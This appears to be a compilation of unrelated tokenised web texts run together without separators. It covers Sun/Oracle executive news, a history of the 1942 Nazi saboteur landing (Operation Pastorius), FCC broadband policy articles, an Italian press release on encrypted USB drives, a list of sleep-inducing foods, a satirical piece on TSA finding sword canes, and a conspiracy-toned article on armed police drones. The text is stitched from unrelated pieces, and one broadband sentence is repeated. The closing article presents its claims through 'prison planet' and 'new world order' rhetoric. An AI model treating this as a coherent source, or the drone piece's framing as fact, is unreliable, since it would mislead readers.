Some of Sun ’s biggest customers in the financial services sector also cut back purchases during the recession .
Schwartz is n’t leaving the company empty - handed .
Regulatory filings reportedly show that he was to receive $ 12 million as part of a severance package from Sun .
Oracle CEO Larry Ellison told The New York Times last week that he did not expect Schwartz to remain with the company , although Ellison reportedly said he hoped to find a role for McNealy .
Oracle has retained another high - ranking Sun executive , John Fowler , who ran the systems business for Sun and will continue as the head of the hardware business for Oracle .

Just after midnight on the morning of June 13 , 1942 , twenty - one - year - old coastguardsman John Cullen was beginning his foot patrol along the coast of Long Island , New York .
Although this particular stretch of beach was considered a likely target for enemy landing parties , the young Seaman was the sole line of defense on that foggy night ; and his only weapon , a trusty flashlight , was proving ineffective against the smothering haze .
As Cullen approached a dune on the beach , the shape of a man suddenly appeared before him .
Momentarily startled , he called out for the shape to identify itself .
“ We ’re fishermen from Southampton , ” a voice responded .
A middle - aged man emerged from the soupy fog , and continued , “ We ’ve run ashore . ”
This sounded plausible to Cullen , so he invited the fisherman and his crew to stay the night at the nearby Coast Guard station .
The offer appeared to agitate the man , and he refused .
“ We do n’t have a fishing license , ” he explained .
Just as Cullen ’s suspicions began to grow , a second figure appeared over the dune and shouted something in German .
The man in front of Cullen spun around , yelling , “ You damn fool !
Go back to the others ! ”
Then he turned back to Cullen with an intensity in his expression that left the Seaman paralyzed⁠⁠ — for he was now almost certain that he was alone on the beach with a party of Nazi spies .
The German agent stood close , and hissed , “ Do you have a mother ?
A father ? ”
As Cullen nodded , he continued , “ Well , I would n’t want to have to kill you . ”
He held out a wad of cash .
“ Forget about this , take this money , and go have a good time . ”
Cullen , realizing this might be his only chance to walk away alive , decided to accept .
As he reached for the roll of bills , the man suddenly lunged forward and seized Cullen ’s flashlight .
He then pointed the light toward his own face .
“ Do you know me ? ” he asked .
Seaman second class John C. Cullen
“ No sir , I never saw you before in my life . ”
“ My name is George John Davis .
Take a good look at me .
You ’ll be meeting me in East Hampton sometime . ”
With that , he released his grip on the flashlight and the money , and disappeared back into the fog .
The shocked coastguardsman took a few hesitant paces backward , then whirled around and set off at a run for the Coast Guard station to inform his superiors that their fears had been realized .
Cullen ’s suspicion was correct , but the man he ’d confronted was no hardened military commander .
His real name was George John Dasch , a waiter and dishwasher who ’d come to the attention of the German High Command for the time he ’d spent living in America before the war .
He and a team of three similarly inexperienced agents had been given several weeks of intense training at a secret farm near Berlin before being ushered onto a U - boat bound for the US coast .
Their mission , led by Dasch , was to sabotage America ’s manufacturing and transport sector , and to terrorize the country ’s civilian population .
It would be known as Operation Pastorius .
The evening ’s events had already damaged Dasch ’s tenuous hold on the group .
Unbeknownst to Seaman John Cullen , two armed sailors had been crouched in the darkness during the conversation on the beach , awaiting the signal to attack .
The landing party had been left with standing orders to kill anyone who confronted them during the landing .
But Dasch had chosen to let the man go , and his assurances that he had “ buffaloed ” the coastguardsman did not convince his men .
After some nervous arguing back and forth , the saboteurs finished burying their supplies in the sand , and set out for the nearby Long Island Railroad Station .
In the meantime , John Cullen reached the Coast Guard post and breathlessly recited what he ’d seen , handing over the bribe money as evidence .
Though skeptical , and concerned about raising a false alarm , his superiors agreed to send out an armed patrol to investigate .
They were led back to the site by Cullen , where any doubts were quickly dispelled ; in the pre-dawn light , the men could see the outline of a German submarine dislodging itself from a sandbar just offshore .
Once it had gone , a quick search of the area revealed a series of small crates buried under a shallow layer of sand .
Inside were large quantities of explosives , detonation equipment , Nazi uniforms , and quality German liquor .
Once the news reached FBI Director J. Edgar Hoover around noon , his excitement could hardly be contained .
As Attorney General Francis Biddle later recalled , “ All of Edgar Hoover ’s imaginative and restless energy was stirred into prompt and effective action .
He was determined to catch them all before any sabotage took place . ”
Coast Guard Station at Amagansett , New York
Here at last was a chance for Hoover to prove his organization ’s value to the war effort .
But the situation was delicate ; making the story public would put every American citizen on the lookout for the Germans , but it would also alert the suspects to the hunt and might cause public hysteria⁠⁠ — not to mention considerable embarrassment for Hoover and his Bureau if the search should fail .
It was therefore decided that a media blackout be imposed .
Quietly , with only the most professional degree of panic , the FBI began the largest manhunt in its history .
By this time , the four would - be terrorists were settled in New York City , preparing for their task from the comfort of fancy hotels and fine restaurants .
They had $ 84,000 in mission funds to enjoy⁠⁠ — equivalent to over $ 1 million today⁠⁠ — and in the great melting pot of New York City their German accents raised nary an eyebrow .
They remained completely unaware that their essential supplies had already been confiscated and that the entire might of the FBI was secretly on the lookout for them .
But George John Dasch , the group ’s daring leader , had a secret of his own .
The day after the landing he called Ernst Peter Burger , the most guarded and disciplined member of the team , into the upper - storey hotel room the two men shared .
He walked over to the window and opened it wide .
“ You and I are going to have a talk , ” Dasch said , “ And if we disagree , only one of us will walk out that door⁠⁠ — the other will fly out this window . ”
He then revealed the truth to Burger : he had no intention of going through with the mission .
He hated the Nazis , and he wanted Burger on his side when he turned the entire plot over to the FBI .
Burger smiled .
Having spent seventeen months in a Nazi concentration camp , his own feelings for the party were less than warm .
He , too had been planning to betray the mission .
They were agreed .
The two men were uncertain how best to proceed with their plan .
They were reluctant to contact the authorities , having been told by their handlers that the Nazis had infiltrated the FBI .
Eventually , Dasch concluded that their best option was an anonymous phone call to test the waters and arrange for further contact .
He called the FBI ’s New York Field Office , and after several transfers was put in touch with a special agent .
Identifying himself as “ Pastorius , ” the name of the mission , Dasch carefully recited his story .
Then , ominously , the man on the other end of the line hung up .
Dasch was stricken with panic .
Had he just exposed himself to a Nazi spy ?
Had the call been traced ?
George John Dasch ( left ) and Ernst Peter Burger ( right )
In fact , he had been speaking to the office ’s “ nut desk , ” the post responsible for fielding calls from Cleopatra and the wolf - man .
In the midst of the most important case in the Bureau ’s history , the agent on duty had dismissed their only lead as a prank .
Shaken but not discouraged , Dasch ordered Burger to stay put and keep an eye on the other men while he headed for Washington D.C. to set things straight .
The morning of June 19 , a week after his landing at Long Island , Dasch stepped into the FBI ’s headquarters carrying a briefcase .
He explained who he was and asked to speak with Director Hoover .
The agents in the building , however , were too busy catching spies to be bothered with every crackpot off the street who happened to know classified details about secret Nazi landings .
Dasch was bounced from office to office until finally Assistant Director D.M. Ladd , the agent in charge of the manhunt , agreed to humor him with five minutes of his time .
Dasch angrily repeated his story , only to find himself greeted once again with patronizing nods and glances toward the door .
Fed up at last , he lifted the briefcase he had been carrying , tore open its straps , and dumped the entire $ 84,000 of mission funds onto the Assistant Director ’s desk .
Ladd blinked with astonishment and began to reconsider Dasch ’s claims .
For the next week , Dasch was the subject of an intense interrogation , and he happily revealed all he knew .
His operation , he explained , was just the first of a long series of sabotage missions planned by the Germans to cripple the American war effort .
They were scheduled to land every six weeks , with the second team expected imminently .
Dasch exposed the targets he had been instructed to hit as well as the methods he had been trained to use .
He revealed key information about German war production , plans , and equipment .
He turned over a handkerchief upon which the names of local contacts had been written in invisible ink⁠⁠— although Dasch , who had snoozed his way through spy school , could n’t remember how to reveal it .
Most important of all , Dasch disclosed the locations of his three accomplices and their aliases , taking care to note Burger ’s role in the defection .
The three men who had landed with Dasch were quickly located using the information he ’d supplied .
Dasch knew little about the second four - man team , but with the help of his handkerchief contacts⁠⁠ — which the FBI ’s lab quickly discovered could be revealed by ammonia fumes ⁠⁠ — they were soon tracked down and arrested .
Just two weeks after the first landing , and without a single attempt at sabotage , all eight men were in custody .
J. Edgar Hoover
Hoover broke the media blackout on the evening of June 27 .
Across the nation , American citizens were astonished to wake up to front - page headlines declaring “ U - BOATS LAND SPIES ; EIGHT SIEZED BY FBI . ”
But it was n’t the story known to those on the inside .
Hoover reasoned that letting the truth be known now would do nothing to discourage the Germans from making further sabotage attempts .
It was better to perpetuate the myth of an invincible FBI that had halted the plot through its own ingenuity and all - seeing eye⁠⁠ — a story that also happened to fit nicely into Hoover ’s personal agenda .
At his press conference , Hoover therefore made no mention of the defection of Dasch , or indeed of any details on how the case was broken .
He opted instead to praise the brilliance and efficiency of his FBI .
“ The detective work of the century , ” Hoover called it , referring perhaps to agent Ladd ’s astute observation of $ 84,000 cash bouncing off of his forehead .
Further details , he explained , would have to wait until after the war .
The unsatisfied press room erupted with speculations about elite FBI agents infiltrating the Gestapo and the High Command .
Hoover refused to confirm any such wild theories , but his triple - eyebrow raises , exaggerated winks , and menacing cackles encouraged the reporters to adopt their own conclusions .
With the last of his accomplices rounded up , it was time at last for Dasch to get his due .
On July 3 , his contacts at the FBI greeted him with smiles and handcuffs , and tossed him into a cell alongside his men .
It was not the response Dasch had been expecting , but the arresting agents assured him it was little more than a formality .
If he just went along with it , he was told , J. Edgar Hoover would ensure that he received a presidential pardon within 6 months .
Hoover had indeed already spoken to President Roosevelt about the arrest , but his conversation had nothing to do with advocating Dasch ’s release .
The president was given an account similar to the one furnished to the press , with no mention of Dasch or Burger ’s role in the investigation .
According to Hoover , Dasch had been “ apprehended ” two days after his accomplices ; and the arrest had been made in New York , not Washington , implying that the arrest of the subordinates had led to the capture of their leader rather than the other way around .
Hoover ’s revisions to the story may have had something to do with the river of letters and telegrams later received by the president urging him to award the FBI Director with the Congressional Medal of Honor .
As it turned out , the majority of these messages came from the FBI ’s own Crime Records Division , the office just a few doors down from Hoover ’s .
The campaign , however , was unsuccessful .
Explosive supplies recovered from the landing beach
Whether Operation Pastorius ’s slapdash team of blue - collar workers and government pencil - pushers ever posed much of a threat is somewhat debatable .
At the time of their capture , most of the saboteurs were too busy visiting gambling establishments and prostitutes to be planning any major acts of sabotage .
Several were reuniting with family they ’d left behind in America , while another had met up with an old girlfriend and was in the process of planning his wedding .
The German High Command had perhaps misjudged the wisdom of sending naturalized citizens to attack their own adopted country .
Nevertheless , the only concern of the US government was in reassuring its citizens and sending a powerful message to the Nazis .
Since the men had n’t actually committed any crime , a normal court could sentence them to at most a few years in prison⁠ ⁠ — or even acquit them entirely .
To President Roosevelt , this was unacceptable .
In a memorandum sent to Attorney General Biddle , he wrote : “ Surely they are as guilty as it is possible to be and it seems to me that the death penalty is almost obligatory . ”
A military tribunal , he felt , was the only way to ensure this outcome .
“ I wo n’t give them up , ” he told Biddle , “ I wo n’t hand them over to any United States marshal armed with a writ of habeas corpus . ”
He would find no objections among the American populace .
As shown in polls and editorials across the country , the general public was overwhelmingly in favor of execution for all eight terrorists .
A letter printed in one newspaper called for the men to be fed to Gargantua , the Ringling Brothers ’ famous giant circus gorilla .
Within a month of the initial landing at Long Island , the eight saboteurs were put before a closed - door US military tribunal⁠⁠ — the first to be assembled since the days of the Civil War .
It was presided over by a panel of seven generals ; there would be no jury , no press , and no appeal .
During the trial , none of the defendants denied their involvement with the plot , instead claiming that they were forced into the mission by the Nazis , or that they had joined as a means to escape from Germany .
Due to his unique circumstances , Dasch was defended separately .
His counsel argued competently in his favor , noting that the case would never have been broken without him , that the FBI had promised him his freedom , and that he clearly had been planning to betray the mission from the start .
Not only had he disobeyed orders by sparing coastguardsman Cullen , he had also deliberately revealed his face and assigned name ⁠ ⁠ — George John Davis⁠⁠ — to the man .
Explosive delay devices disguised as pens , submitted as evidence
After 16 days in session and two rejected constitutional appeals from the defense , both sides had said their piece .
A verdict was signed and sent directly to the president , who was to be the final arbiter of the sentencing .
It was unanimous : the Germans , all eight of them , were guilty .
The recommended sentence was death .
It was only upon reading the transcript of the trial that Roosevelt learned how Hoover had misled him .
Regardless , it apparently did n’t shake the foundation of his opinion on the case .
At the urging of defense counsel , FDR gave only enough ground to commute Dasch ’s sentence to 30 years of hard labor , and Burger ’s to life .
George John Dasch , a man who had envisioned himself being welcomed as a hero by the American people and perhaps earning his own Medal of Honor , would instead spend what was likely to be the rest of his life in prison .
His six accomplices were not so fortunate .
Five days after the trial ’s end , they were marched to the electric chair in alphabetical order .
Within two months of landing in America , the men had been captured , charged , tried , and executed .
The official verdict of the tribunal would n’t be released for another three months .
Dasch and Burger were locked away in a federal penitentiary , their true story only known to a handful of military and government officials .
But as ethically suspect as J. Edgar Hoover ’s deception may have been , his cover - up worked .
Hitler was infuriated at the news of his men ’s capture , and he refused to risk another submarine for further missions .
Just as he had intended , Hoover effectively stopped any attempts at German sabotage for the remainder of the war .
Burger and Dasch ’s stories did n’t end in prison .
After the Allied victory in Europe , the documents pertaining to their case were released to the public despite the strenuous objections of J. Edgar Hoover .
With the truth out in the open , and after a further three years of squirming , President Harry S. Truman finally agreed to commute the two men ’s sentences .
Having spent six years in federal prison , they were released and deported to Germany .
The Nazi saboteurs in court
The consequences of the 1942 Nazi sabotage plot remain very much present today .
In the aftermath of the September 11 , 2001 terrorist attacks , the United States government approved the use of military tribunals to try captured terrorist suspects .
The major precedent for these tribunals is the case of Ex parte Quirin⁠⁠ — the trial of George John Dasch and his seven Nazi agents .
Their hastily assembled tribunal will also be looked to as the model for any future prosecution of “ unlawful combatants . ”
Stepping off the plane onto German soil , Dasch and Burger found themselves two men without a home : criminals in America and traitors in Germany .
Burger turned against his former commander , publicly blaming him for the entire debacle before disappearing several years later .
For his part , Dasch refused to run ; he spent the rest of his life campaigning for acceptance in Germany and for a chance to return to America .
He never received either .
Dasch died in Germany in 1992 , still awaiting the pardon promised him by J. Edgar Hoover half a century earlier .
Excitement about the approach of the Federal Communications Commission 's National Broadband Plan , due March 17 , is inspiring ever more dramatic calls for greater high - speed Internet connectivity in the United States .
This month , FCC Chair Julius Genachowski declared that the agency wants 260 million Americans hooked up to 100 Mbps broadband by 2020 .
Not to be outdone , the Media and Democracy Coalition says that by that same year consumer access to " world - class networks " should equal the present rate of telephone adoption ( 90 % + ) .
As these calls for ever higher benchmarks reach a fever pitch , it 's worth remembering some of the grand proclamations of yesteryear .
Take , for example , the TechNet group 's 2002 recommendation that the government should commit to a goal of 100 Mbps to 100 million homes and small businesses by the end of the decade — in other words , now .
The consortium included CEOs and executives from Cisco , Microsoft , and Hewlett Packard .
Principle number one , they declared , was that the US " should foster innovation and reduce regulations — especially with respect to broadband applications and services . "
But in case you did n't notice , 100 M bps x 100 million did n't happen .
About 75 to 77 million Americans currently access some kind of broadband , according to the latest data .
That 's only assuming , however , that you accept 200 Kbps as a flavor of " high speed Internet . "
And a huge chunk of the population ( over 30 percent ) never go online at all — less because they 're retired and not interested ; more often because they can't afford the prices .
So why this shortfall of progress , especially compared to other countries ?
Some argue that everything is going fine .
The US is just too spread out , that 's all — and we 'll catch up in due time .
Others contend that we just have n't spent enough government or private sector money on the problem .
But the big thesis these days is that we missed the boat by curtailing wholesale network access to the big telcos and cable ISPs .
By making it more expensive for smaller providers to link to AT&T , Verizon , Comcast , or Time Warner Cable in order to build out their own middle - mile systems , the government condemned most consumers to two ISP choices , at best .
The FCC's own recently commissioned study by Harvard 's Berkman Center declared that " there is extensive evidence to support the position , adopted almost universally by other advanced economies , that open access policies , where undertaken with serious regulatory engagement , contributed to broadband penetration , capacity , and affordability in the first generation of broadband . "
We 're not going to categorically proclaim that this is indeed the solution to the nation 's broadband woes .
But there 's no question that the policy of the FCC for the last dozen years has been to make it more expensive and even harder for businesses and competitive service providers to get Internet or telephone access ( which are increasingly the same thing ) at regulated rates .
When the FCC announced it was letting Berkman do that survey , the Commission 's National Broadband Plan coordinator Blair Levin declared that in so doing , the agency did n't want to " reinvent the wheel . "
But let 's hold onto that wheel metaphor and review the extent to which the US has rolled back open access over the last dozen years .
As you 'll see , on just about every available platform , businesses , smaller telcos , and alternative ISPs have been given a back seat to the game .
Dedicated access
In 1996 , when Congress passed its Telecommunications
Act , everybody was jazzed about the dot - com boom .
Policy makers assumed that investors would pour capital into building out the nation 's middle mile broadband capacity , making it affordable for big corporations and wireless companies to rent lines for enterprise computing and backhaul — the circuits that link cell phone towers to network switches .
Sprint told us the company pays something like seven times for one of the thousands of special access lines it needs than what consumers pay for a single , much faster residential broadband account .
Instead , the boom fizzled .
The FCC , however , kept working under the assumption that deregulation would encourage the construction of more capacity .
It issued an order that gave the green light to the dismantling of " special access " price caps under certain conditions .
If enough access - creating telecommunications infrastructure had " aggregated " or " colocated " in an urban area with more than 50,000 people — the agency would regard this as a sign of significant competition and lift price caps .
In addition , in 2000 the big carriers asked for , and got , yearly reductions in price cap levels based on agreed - upon percentages : three percent in 2000 , and 6.5 percent for the next three years .
Four incumbents — AT&T , BellSouth , QWest , and Verizon — received full price deregulation in over 100 major metropolitan areas .
One of those companies , BellSouth , is now part of AT&T .
But five years later , the Government Accountability Office did an audit of 16 metropolitan areas and found very few signs of growth in facilities - based competition , signs of its shrinkage , and higher special access prices in various cities .
And the GAO concluded that the FCC " does not regularly monitor and measure the development of competition , which will affect how FCC responds to emerging trends , and the actions it takes to encourage and foster such competition . "
Fast forward to now , and Sprint told us the company pays something like seven times for one of the thousands of special access lines it needs than what consumers pay for a single , much faster residential broadband account .
Meanwhile , a report issued last year concluded that special access charges now represent a huge chunk of incumbent telco business .
The National Association of Regulatory Utility Commissioners found that in 1996 , interstate special access represented less than five percent of Qwest's , Verizon's , and AT&T 's total revenue .
In 2007 they represented almost 30 percent of Qwest 's , nearly 25 percent of Verizon's , and close to a fifth of AT &T's .
More than a third of American adults do n't have a fast internet connection at home , leaving some 80 million adults and 13 million children at a distinct disadvantage in a wired world , according to an FCC report released Tuesday .
The survey , conducted by phone last fall , comes less than a month before the FCC gives Congress the country 's first comprehensive plan to make broadband ubiquitous and affordable .
The survey , Broadband Adoption and Use in America ( .pdf ) , was intended to help the agency figure out why broadband adoption is so low and what it can do to bring the wonders of Facebook , Twitter , online education and sophisticated time wasting to millions more .
Not surprisingly , more than a third of broadband laggards , 36 percent , cited the high cost of broadband and technology , even as entry - level computers and laptops have become very affordable .
But survey users report they spend an average of $ 41 a month on broadband – which comes to nearly $ 500 annually .
Others say they lack the skills to get online ( 10 percent ) or think it 's too dangerous to either their financial security or their morals ( also 10 percent ) .
Nearly 20 percent without broadband say they do n't bother to subscribe , because there are 800 million web sites , but nothin's on – or if they have dial - up , that there 's nothing worth getting faster .
The survey also found that most without broadband cited a number of concerns , so that a grumpy grandpa who says he does n’t need that there Twitter also said it was just too darn expensive .
The survey also found that most without broadband cited a number of concerns , so that a grumpy grandpa who says he does n't need that there Twitter also said it was just too darn expensive .
While the causes vary , the good news is that 30 percent are " Near Converts " who'd like broadband but mostly stay away due to the cost .
Digital Hopefuls , a category that leans heavily toward Hispanic and African Americans , think broadband would be good , but many lack the money and skills needed to get online .
And then there 's the group that 's just never going to go online – even if you gave them iPads for free – whom the FCC delicately describes as " Digitally Distant . "
They 're mostly older people , many of whom are retirees .
The report also found divisions along income , education and race .
For example , 52 percent of Americans in households with annual incomes of $ 50,000 or below have broadband at home , compared with 87 percent of those in households with incomes above that level .
The report will bolster telecom arguments that the nation 's broadband plan should be mostly about educating users , promoting adoption and even subsidizing construction or broadband connections .
While activist groups are strong supporters of the government closing the so - called digital divide , they see the best hope for that in larger structural changes to the market , like forcing carriers to rent their lines to competitors or making fiber a public utility rented out to ISPs .
Those ideas are anathema to the telecom industry , which told the FCC Monday that any moves to force them to rent out their wired infrastructure at fair rates would lead to stifling and drawn - out lawsuits .
The FCC 's national broadband plan is due to Congress on March 17 , though the feds are in the process of handing out more than $ 4 billion in stimulus funds already .

La sicurezza dei dati e delle informazioni personali è un aspetto fortemente presente nella nostra società , dalla sfera politica a quella sociale e privata .
Ben consci di tutto ciò , Transcend e Corsair hanno annunciato la disponibilità di nuove pendrive " blindate " .
Transcend ha appena presentato JetFlash 620 , la chiavetta USB ideale per l’archiviazione e la protezione dei propri file più importanti dagli accessi non autorizzati .
Combinando performance elevate ad un sistema di sicurezza tramite password in un dispositivo dal design compatto e leggero , la novità Transcend è un vero e proprio must - have per tutti coloro che sono alla ricerca di un dispositivo portatile veloce ed estremamente sicuro .
Oltre ad integrare l’algoritmo di cifratura a 256 - bit AES ( Advanced Encryption Standard ) , infatti , la nuova JetFlash 620 di Transcend è dotata dell ’esclusivo software JetFlash SecureDrive , che aiuta a proteggere i dati personali dell ’utente attraverso la creazione di un’area privata protetta da password .
Una volta attivata , nessuno se non il possessore della parola chiave sarà in grado di visualizzare ed accedere ai file salvati all ’interno della Private Zone .
La JetFlash 620 consente inoltre agli utenti di ridimensionare con facilità la propria area privata e di cambiare password frequentemente , affinché i dati personali non si trovino mai nelle mani di hacker , collaboratori ficcanaso , parenti curiosi o ladri di identità .
Grazie all ’impiego della tecnologia dual - channel ( è costruita con chip di memoria NAND Flash di qualità superiore e gode di garanzia a vita ) , la chiavetta Transcend è inoltre capace di trasferire i dati ad una sorprendente velocità di 32 MB / s ed offre un’ampia capacità di archiviazione - 8GB , 16GB e 32GB - , fornendo tutto lo spazio necessario per il salvataggio di file , musica , immagini digitali , documenti di lavoro e presentazioni .
E ' inoltre possibile scaricare e installare sulla chiavetta il software di gestione dei dati JetFlash Elite di Transcend , trasformando il drive in un dispositivo che effettua l’accesso automatico ai propri account web o che blocca temporaneamente il computer per prevenire gli accessi non autorizzati .
Grazie alle funzioni Internet Favourites e Mobile Email , inoltre , gli utenti potranno navigare sui propri siti internet preferiti e controllare la propria email da qualsiasi computer compatibile .
Nulla di esorbitante sul fronte dei prezzi : si va dai 25,00 € del modello da 8GB ai 48,00 € per quello da 16GB e 93,00 € per la più capiente versione da 32GB .
Anche Corsair ha annunciato la disponibilità di Flash Padlock 2 , la nuova unità flash USB sicura , progettata in modo intelligente e completo per proteggere i dati di importanza critica di aziende e privati dagli accessi non autorizzati .
Flash Padlock 2 utilizza due tecnologie di sicurezza per la protezione ottimale dei dati .
La prima consiste in un numero di identificazione personale definito dall ' utente , detto anche PIN .
Il PIN , necessario per sbloccare l'unità e accedere ai dati , viene inserito utilizzando il tastierino numerico integrato nel dispositivo .
Non è possibile accedere a Flash Padlock 2 se non si inserisce correttamente il PIN specifico per quell ' unità .
La seconda tecnologia utilizzata per la protezione dei contenuti dell ' unità è la crittografia AES a 256 bit .
La crittografia AES a 256 bit è considerata dalle aziende e dai governi di tutto il mondo lo standard più efficace per la protezione dei dati e la sua integrazione in Flash Padlock 2 garantisce protezione assoluta dei dati anche in caso di apertura dell ' unità per accedere alla memoria flash .
Un'altra caratteristica fondamentale di Padlock 2 è non dipendere da una piattaforma specifica .
La maggior parte delle unità flash USB dotate di crittografia hardware richiedono l'uso di un'applicazione software per l'immissione della password del dispositivo .
Flash Padlock 2 , invece , include un tastierino numerico e dunque non richiede nessuna applicazione software .
In questo modo l'utente è in grado di accedere ai propri dati protetti da qualunque ambiente , inclusi PC Windows , Mac , computer Linux , console di gioco e attrezzature per l'intrattenimento .
La nuova unità Flash Padlock 2 include diversi miglioramenti rispetto alla premiata unità Padlock originale .
Oltre all 'offerta della crittografia AES a 256 bit , è stata aumentata in modo esponenziale la sicurezza della comunicazione tra processore e controller USB .
Flash Padlock 2 , inoltre , offre la possibilità di creare un nuovo PIN nel caso in cui quello originale andasse smarrito , una procedura che comporta la cancellazione del contenuto dell ' unità .
Infine , l'involucro è più piccolo ed è stato rinforzato , garantendo così protezione assoluta dei dati sia da agenti esterni che da occhi indiscreti .
Flash Padlock 2 ha una capacità di 8 GB ed è già disponibile ad un prezzo ancora non ben noto .
L'unità è supportata da una garanzia limitata di 10 anni , che include anche servizio di assistenza clienti via telefono , e-mail , forum e Tech Support Xpress .

What is the secret to getting a solid 7 to 8 hours of sleep ?
Head for the kitchen and enjoy one or two of these 10 foods .
They relax tense muscles , quiet buzzing minds , and / or get calming , sleep - inducing hormones – serotonin and melatonin - flowing .
( Pics )
Bananas .
They ’re practically a sleeping pill in a peel .
In addition to a bit of soothing melatonin and serotonin , bananas contain magnesium , a muscle relaxant .
Chamomile tea .
The reason chamomile is such a staple of bedtime tea blends is its mild sedating effect – it ’s the perfect natural antidote for restless minds / bodies .
Warm milk .
It ’s not a myth .
Milk has some tryptophan – an amino acid that has a sedative – like effect – and calcium , which helps the brain use tryptophan .
Plus there ’s the psychological throw - back to infancy , when a warm bottle meant “ relax , everything ’s fine . ”
Honey .
Drizzle a little in your warm milk or herb tea .
Lots of sugar is stimulating , but a little glucose tells your brain to turn off orexin , a recently discovered neurotransmitter that ’s linked to alertness .
Potatoes .
A small baked spud wo n’t overwhelm your GI tract , and it clears away acids that can interfere with yawn - inducing tryptophan .
To up the soothing effects , mash it with warm milk .
Oatmeal .
Oats are a rich source of sleep – inviting melatonin , and a small bowl of warm cereal with a splash of maple syrup is cozy – plus if you ’ve got the munchies , it ’s filling too .
Almonds .
A handful of these heart - healthy nuts can be snooze - inducing , as they contain both tryptophan and a nice dose of muscle - relaxing magnesium .
Flaxseeds .
When life goes awry and feeling down is keeping you up , try sprinkling 2 tablespoons of these healthy little seeds on your bedtime oatmeal .
They ’re rich in omega - 3 fatty acids , a natural mood lifter .
Whole - wheat bread .
A slice of toast with your tea and honey will release insulin , which helps tryptophan get to your brain , where it ’s converted to serotonin and quietly murmurs “ time to sleep . ”
Turkey .
It ’s the most famous source of tryptophan , credited with all those Thanksgiving naps .
But that ’s actually modern folklore .
Tryptophan works when your stomach ’s basically empty , not overstuffed , and when there are some carbs around , not tons of protein .
But put a lean slice or two on some whole - wheat bread mid-evening , and you ’ve got one of the best sleep inducers in your kitchen .
What if none of these foods help you get your zzz’s ?

Is airport security just a massive prank played on us by our reptilian overlords ?
The biggest threats to America 's airports recently : underpants bombs , wrong - way smoochers and bottles of honey .
And now : sword canes .
Yes , canes with swords in them .
But wait :
Are n't sword canes only carried by Romantic poets and villains in Bond movies ?
According to the Wall Street Journal , they are also wielded ( unwittingly ) by 78 year - old retired deli owners on their way to visit their relatives in Seattle :
As Transportation Security Administration officers examined the cane , they discovered it had a special feature hidden within : a 16 - inch sword .
" It was so interesting , " Mr. Sanjideh said of the cane , which his wife bought for him at a flea market .
" I did n't know it had a sword in it . "
Indeed it is very " interesting " that your cane had a massive sword in it , Sanjideh !
TSA agents questioned him and let him go ( sans sword cane ) after being convinced he was just some old dude who did n't know his cane had a sword in it — not a devious , geriatric dandy - terrorist .
So , that 's funny , some old guy had a sword cane .
Ha ha , what a weird one - time incident ...
Digg it or post it on your Facebook wall or something .
But wait !
Since 2002 , TSA screeners have found more than 200 canes concealing either swords or knives .
Many of these incidents involve elderly travelers who are just as surprised as the security screeners to find sabers hidden inside canes they may have inherited , found at antique shops , or received from charities .
In September alone , four such incidents occurred according to documents provided by the TSA .
200 sword canes in less than ten years !
Remember :
It only takes one granny accidentally slipping on a plane with a sword cane and then a terrorist who is also on the plane realizes that the cane has a sword in it and uses the sword to hijack the plane .
JUST ONE .
( And you can forget ever getting your hands on an official Conde Nast Traveler Sword Cane . )
Here are some of the other impressive weapons the TSA has found hidden in canes :
A 2 1/2 - inch knife at San Diego International Airport
A 13 - inch sword at Philadelphia International Airport
A " double - sided metal blade more than 2 feet long " at San Antonio International Airport
An 18 - inch blade at Buffalo Niagra International Airport
Sword canes .
This only makes sense when you pull back and consider the absurd theater that is airport security circa January 10th , 2010 :
An accessory popular with aristocratic gentlemen of the 1800s is freaking out TSA screeners nationwide ; German privacy advocates go through airport security in their underwear ; James Carville urges the TSA to measure his penis ; underwear is exploding ; travelers describe their private part pat downs in detail in the Times ; some people want airports to install mind reading systems ; Diarrhea , a clumsy " Love Actually " reenactment by a Chinese grad student and bottles of honey in Gatorade bottles spark massive delays and inspire general panic .
Oh , also , terrorists still want to kill us .

Illustrating once again that the prison planet being built around us far outstrips anything Aldous Huxley or George Orwell ever imagined , a Wired News report details how police forces worldwide are preparing to unveil drone aircraft that can not only conduct surveillance of protesters , but also zap them into submission with non-lethal weapons .
As part of their ongoing mission to “ protect and serve ” the new world order , cops across the world are getting access to military drones which allow them to “ carry out surveillance on everyone from protesters and antisocial motorists to fly - tippers , ” reports Wired News .
The report details how the future of policing will resemble something approaching a combination of They Live and The Running Man , with unmanned drones replacing police helicopters whizzing around everywhere torturing and knocking out anyone who misbehaves .
According to the report , this is a natural progression from CCTV cameras that shout at passers - by , currently deployed in several UK cities , only now drones will be fitted with LRAD acoustic devices , torture sound weapons that were indiscriminately used and abused during the G20 summit in Pittsburgh on innocent members of the public who were just walking down the street and had not even dared to engage in the criminal activity of expressing their First Amendment right to assemble .
“ The LRAD has been tested on the Austrian S - 100 unmanned helicopter , and the technology is ready if there is a police requirement , ” states the article .
[ efoods ]
Also available to police will be a drone that can fire tear gas as well as rubber pellets to disperse anyone still living under the delusion that they were born in a democratic country .
“ French company Tecknisolar Seni has demonstrated a portable drone armed with a double - barrelled 44 mm Flash - Ball gun , ” states the report .
“ Used by French special police units , the one - kilo Flash - Ball resembles a large calibre handgun and fires non-lethal rounds , including tear gas and rubber impact rounds to bring down a suspect without permanent damage — “ the same effect as the punch of a champion boxer , ” claim makers Verney - Carron . ”
Of course the fact that the Flash - Ball devices have caused “ permanent damage ” in the form of head injuries is glossed over .
Another option will be a mini-flying saucer drone fitted with a Taser gun , primed to shoot 50,000 - volts into anyone who refuses to bow down at the feet of global government .
“ Taser stun guns are now so light ( about 150 grams ) that they could be mounted on the smaller drones .
Antoine di Zazzo , head of SMP Technologies , which distributes tasers in France , says the company is fitting one to a small quad - rotor iDrone ( another quad - rotor toy helicopter ) , which some have called a “ flying saucer ” .
Since police routinely use Tasers as a method of “ pain compliance , ” ie torture , and not in genuinely threatening situations , abuse of the devices is widespread in every country that has introduced them .
Since June 2001 , over 350 people have died in the United States after being hit with these “ non-lethal weapons ” .
Imagine how incidents of abuse would skyrocket once the personal element of using a Taser is removed and they are strapped to marauding surveillance drones , eliminating any responsibility for deaths and injuries that occur .
Why not just equip the drones with hellfire missiles and have done with it ?
Now it ’s admitted that the authorities treat any dissenter , any protester , anyone who questions the system , even anyone who takes a photograph in public as a terrorist , why not just blow us all away like they do to “ insurgents ” in Afghanistan ?
The fact that every one of these fascistic and futuristic tools of enslavement is being primed to be used mainly against protesters only confirms that the police state is not coming , it ’s not some future threat , it ’s here in 2010 – we ’re living in a world that does not tolerate dissent against its overlords , we ’re truly living on a prison planet .

